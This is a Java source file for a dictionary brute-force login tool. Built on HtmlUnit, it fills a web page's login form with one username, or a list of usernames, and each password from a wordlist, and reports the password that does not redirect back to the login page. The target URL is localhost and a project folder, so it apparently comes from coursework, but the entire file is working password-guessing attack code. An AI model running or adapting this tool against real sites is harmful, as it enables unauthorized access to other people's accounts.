package com.company;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.*;

import java.io.IOException;
import java.lang.reflect.Array;
import java.util.ArrayList;

public class FormLogin {

    String url;

    String username;
    ArrayList<String> usernames;
    ArrayList<String> dictionary;
    int maxLength;
    String characterSpace;

    boolean manyUsernames;

    WebClient client;
    HtmlPage page;
    HtmlForm form;

    public FormLogin(String url, String username, ArrayList<String> dictionary) {
        this.username = username;
        this.dictionary = dictionary;
        this.url = url;
    }

    public FormLogin(String url, String username, ArrayList<String> dictionary, ArrayList<String> usernames) {
        this.username = username;
        this.dictionary = dictionary;
        this.url = url;
        this.usernames = usernames;
        manyUsernames = true;
    }


    public void setup() {
        client = new WebClient();

        try {
            HtmlPage page = (HtmlPage) client.getPage(url);
            form = page.getFormByName("login");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void login() {

        if (manyUsernames) {

            for (String n : usernames) {
                System.out.println("Using username: " + n);
                username = n;
                startAttempts();
            }
        } else {
            startAttempts();
        }
    }

    public void startAttempts() {
        for (int i = 0; i < dictionary.size(); i++) {

            try {

                String password = dictionary.get(i);

                form.getInputByName("username").setValueAttribute(username);

                form.getInputByName("password").setValueAttribute(password);

                HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);

                Page result = button.click();
                String resultUrl = result.getUrl().toString();

                if (resultUrl.equals("http://localhost/3200-project/index.php")) {
                    System.out.println("Failed attempt with password: " + password);

                } else {
                    System.out.println("Success! Password is " + password);
                    break;
                }


            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }


}
